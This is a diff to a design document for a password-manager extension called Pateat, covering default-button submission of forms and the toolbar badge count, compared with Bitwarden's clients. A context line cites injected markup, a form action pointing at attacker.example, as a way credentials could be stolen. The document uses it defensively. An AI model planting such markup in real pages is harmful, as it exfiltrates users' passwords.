@@ -100,6 +100,18 @@ Pateat's rule is in [Background execution](architecture.md#background-execution)
   unparsable values are refused. Injected markup on an admitted page, such as a dangling
   `<form action="https://attacker.example/">` or a `<base href>`, would otherwise
   receive the username and password.
+- A form that shows no button (ADR 0064) is submitted by Enter in its last field: Pateat
+  clicks the form's default button, its first submit button in tree order among the
+  form's controls, or calls `requestSubmit()` when it has none. The official auto-submit
+  (only under the automatic app login policy) instead clicks the first submit button in
+  the form's subtree whose words match its login button names, then a plain button so
+  named, then calls `requestSubmit()`, walks up from the last field when there is no
+  form, and never checks `disabled`
+  ([auto-submit-login.ts](https://github.com/bitwarden/clients/blob/abccf1e342dccba06a3cc635cd4c706defa64a32/apps/browser/src/autofill/content/auto-submit-login.ts#L111-L240)).
+  Pateat reads no button words (ADR 0033; the generation role judges the buttons it
+  saw), needs a `<form>`, and presses no default button that is disabled, associated
+  with the form only through `form=`, or already shown when the fill began, which the
+  generation role saw and did not name; the destination is checked as for a click.
 - A `javascript:` form action is allowed for fill and click (owner's decision,
   2026-10-18 04:19 UTC), as the official clients fill such a form like any other (their
   action handling above has no case for it). Chrome refuses to run the `javascript:` URL
@@ -136,6 +148,19 @@ Pateat's rule is `besideForm` in `packages/inference/src/plan.ts`
   the item matches both the frame's URL and the tab's URL
   ([ADR 0017](adr/0017-login-forms-in-frames.md)): no person is there to answer a
   prompt during an automatic login.
+
+## Toolbar badge
+
+- The official extension counts the ciphers that match the tab's full URL and shows
+  `9+` above 9
+  ([autofill-badge-updater.service.ts](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/apps/browser/src/autofill/services/autofill-badge-updater.service.ts#L52-L66)).
+  Pateat counts the items that match the tab's origin (`origin/`), so a StartsWith or
+  Exact rule for a deeper path is not counted, adds items holding a passkey for the
+  origin's RP IDs, and shows `99+` above 99; items Pateat may not use show their count
+  in light gray instead of being counted with the rest
+  ([ADR 0021](adr/0021-account-choice-outside-settings.md#site-count-badge), owner's
+  decision 2026-10-13 at 14:42 UTC). On an `http:` page only items saved with an
+  `http://` URI count, as for logins (see URI matching above).
 
 ## Passkeys
 
